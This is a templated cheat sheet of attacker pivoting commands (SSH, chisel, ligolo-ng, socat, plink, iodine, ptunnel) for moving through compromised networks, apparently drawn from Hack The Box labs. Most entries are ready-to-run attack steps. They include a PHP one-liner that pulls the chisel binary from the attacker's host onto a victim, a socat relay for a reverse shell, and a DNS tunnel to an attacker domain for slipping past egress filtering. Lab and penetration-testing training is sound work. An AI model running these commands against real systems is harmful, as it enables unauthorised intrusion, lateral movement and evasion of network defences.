# Port Forwarding & Pivoting

> SSH, chisel, ligolo-ng, sshuttle, socat — drawn from real HTB pivoting chains

<!-- tags: pivot, tunnel, network, ssh, chisel, ligolo, post -->

---

## forward ssh local port
Forward attacker:local_port -> remote target through SSH.

```bash
ssh -L {{LOCAL_PORT:port:8080}}:127.0.0.1:{{REMOTE_PORT:port:8080}} {{USERNAME:str:user}}@{{TARGET:ip}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,ssh,local -->

---

## forward ssh local internal host
Reach a host behind the SSH server.

```bash
ssh -L {{LOCAL_PORT:port:5432}}:{{INTERNAL_HOST:ip:10.10.20.5}}:{{INTERNAL_PORT:port:5432}} {{USERNAME:str:user}}@{{TARGET:ip}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,ssh,internal -->

---

## forward ssh remote port
Open a listener on victim that forwards to attacker.

```bash
ssh -R {{REMOTE_PORT:port:8080}}:127.0.0.1:{{ATTACKER_PORT:port:8080}} {{USERNAME:str:user}}@{{TARGET:ip}}
```

<!-- meta: risk=med | phase=post | tags=pivot,ssh,remote -->

---

## tunnel ssh dynamic socks proxy
SOCKS5 proxy through SSH.

```bash
ssh -D {{SOCKS_PORT:port:1080}} -N {{USERNAME:str:user}}@{{TARGET:ip}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,ssh,socks -->

---

## chain ssh proxyjump multi-hop
Chain SSH hops in one command.

```bash
ssh -J {{HOP1:str:user@10.10.10.1}} {{USERNAME:str:user}}@{{INTERNAL_HOST:ip:10.10.20.5}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,ssh,jump -->

---

## tunnel sshuttle subnet vpn
Route subnet through SSH like a VPN.

```bash
sshuttle -r {{USERNAME:str:user}}@{{TARGET:ip}} {{INTERNAL_NET:str:10.10.20.0/24}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,sshuttle,vpn -->

---

## start chisel server reverse
Listen for chisel client.

```bash
./chisel server -p {{PORT:port:8001}} --reverse
```

<!-- meta: risk=safe | phase=post | tags=pivot,chisel,server -->

---

## tunnel chisel reverse socks
Open SOCKS5 reverse proxy on attacker.

```bash
./chisel client {{LHOST:ip}}:{{PORT:port:8001}} R:{{SOCKS_PORT:port:1080}}:socks
```

<!-- meta: risk=med | phase=post | tags=pivot,chisel,socks -->

---

## forward chisel reverse port
Expose victim's localhost:3306 to attacker:3307.

```bash
./chisel client {{LHOST:ip}}:{{PORT:port:8001}} R:{{ATTACKER_PORT:port:3307}}:localhost:{{VICTIM_PORT:port:3306}}
```

<!-- meta: risk=med | phase=post | tags=pivot,chisel,reverse -->

---

## forward chisel internal host
Forward attacker:5000 to internal_host:5000 via victim.

```bash
./chisel client {{LHOST:ip}}:{{PORT:port:8001}} R:{{ATTACKER_PORT:port:5000}}:{{INTERNAL_HOST:ip:10.10.20.5}}:{{INTERNAL_PORT:port:5000}}
```

<!-- meta: risk=med | phase=post | tags=pivot,chisel,internal -->

---

## drop chisel php oneliner
Useful when only RCE/limited shell.

```bash
php -r 'file_put_contents("chisel", file_get_contents("http://{{LHOST:ip}}:{{LPORT:port:8000}}/chisel")); chmod("chisel",0755);'
```

<!-- meta: risk=safe | phase=post | tags=pivot,chisel,drop -->

---

## setup ligolo tun interface
Create the ligolo TUN interface.

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

<!-- meta: risk=safe | phase=post | tags=pivot,ligolo,setup -->

---

## start ligolo proxy
Run the proxy with self-signed cert.

```bash
./ligolo-proxy -selfcert
```

<!-- meta: risk=safe | phase=post | tags=pivot,ligolo,proxy -->

---

## connect ligolo agent
Connect agent back to attacker.

```bash
./agent -ignore-cert -connect {{LHOST:ip}}:{{PORT:port:11601}}
```

<!-- meta: risk=med | phase=post | tags=pivot,ligolo,agent -->

---

## add ligolo route subnet
Route subnet through tunnel (run inside ligolo proxy session).

```bash
sudo ip route add {{INTERNAL_NET:str:10.10.20.0/24}} dev ligolo
```

<!-- meta: risk=safe | phase=post | tags=pivot,ligolo,route -->

---

## add ligolo reverse listener
Expose attacker port via agent (e.g. for relay back).

```bash
echo "ligolo-ng » listener_add --addr 0.0.0.0:{{LISTEN_PORT:port:8888}} --to 127.0.0.1:{{LOCAL_PORT:port:8888}}"
```

<!-- meta: risk=med | phase=post | tags=pivot,ligolo,listener -->

---

## setup proxychains socks
Configure proxychains to route through SOCKS.

```bash
echo "socks5 127.0.0.1 {{SOCKS_PORT:port:1080}}" | sudo tee -a /etc/proxychains4.conf
proxychains4 -q nmap -sT -Pn {{INTERNAL_HOST:ip:10.10.20.5}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,proxychains -->

---

## run proxychains nxc curl
Run common tools through SOCKS.

```bash
proxychains4 -q nxc smb {{INTERNAL_HOST:ip:10.10.20.5}} -u {{USERNAME:str:user}} -p {{PASSWORD:str:pass}}
proxychains4 -q curl -s {{URL:url:http://10.10.20.5}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,proxychains,tools -->

---

## forward socat tcp relay
Quick TCP relay.

```bash
socat TCP-LISTEN:{{LOCAL_PORT:port:8080}},fork,reuseaddr TCP:{{INTERNAL_HOST:ip:10.10.20.5}}:{{INTERNAL_PORT:port:80}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,socat -->

---

## relay socat reverse shell
Relay reverse shell through pivot host.

```bash
socat TCP-LISTEN:{{LOCAL_PORT:port:9001}},fork,reuseaddr TCP:{{LHOST:ip}}:{{LPORT:port:9001}}
```

<!-- meta: risk=med | phase=post | tags=pivot,socat,revshell -->

---

## forward netsh portproxy windows
Built-in Windows port forward.

```bash
netsh interface portproxy add v4tov4 listenport={{LOCAL_PORT:port:8080}} connectaddress={{INTERNAL_HOST:ip:10.10.20.5}} connectport={{INTERNAL_PORT:port:80}}
netsh interface portproxy show all
netsh interface portproxy delete v4tov4 listenport={{LOCAL_PORT:port:8080}}
```

<!-- meta: risk=safe | phase=post | tags=pivot,windows,netsh -->

---

## tunnel plink reverse ssh windows
Pure plink.exe reverse SSH for legacy Windows.

```bash
plink.exe -ssh -l {{USERNAME:str:user}} -pw {{PASSWORD:str:pass}} -R {{REMOTE_PORT:port:8080}}:127.0.0.1:{{LOCAL_PORT:port:8080}} {{LHOST:ip}}
```

<!-- meta: risk=med | phase=post | tags=pivot,windows,plink -->

---

## tunnel iodine dns
Last-resort tunnel via DNS.

```bash
sudo iodined -f -c -P {{PASSWORD:str:secret}} 10.0.0.1/24 {{TUNNEL_DOMAIN:domain:t1.attacker.com}}
sudo iodine -P {{PASSWORD:str:secret}} {{TUNNEL_DOMAIN:domain:t1.attacker.com}}
```

<!-- meta: risk=high | phase=post | tags=pivot,dns,iodine -->

---

## tunnel ptunnel icmp
ICMP tunnel for restrictive egress.

```bash
sudo ptunnel-ng -p {{LHOST:ip}}
```

<!-- meta: risk=high | phase=post | tags=pivot,icmp,ptunnel -->

---

## inspect host routing pivot
Check what subnets the host can reach.

```bash
ip route
ip a
arp -a
cat /etc/resolv.conf
```

<!-- meta: risk=safe | phase=post | tags=pivot,recon -->

---

## list internal listening ports
What's listening locally that we can forward.

```bash
ss -tlnp 2>/dev/null || netstat -tlnp
```

<!-- meta: risk=safe | phase=post | tags=pivot,enum -->

---

## add ligolo route dc 240.0.0.1
Route 240.0.0.1/32 to access "DC itself" via tunnel.

```bash
sudo ip route add 240.0.0.1/32 dev ligolo
echo "Now access dc01 services via 240.0.0.1:5985 etc"
```

<!-- meta: risk=safe | phase=post | tags=pivot,ligolo,trick -->
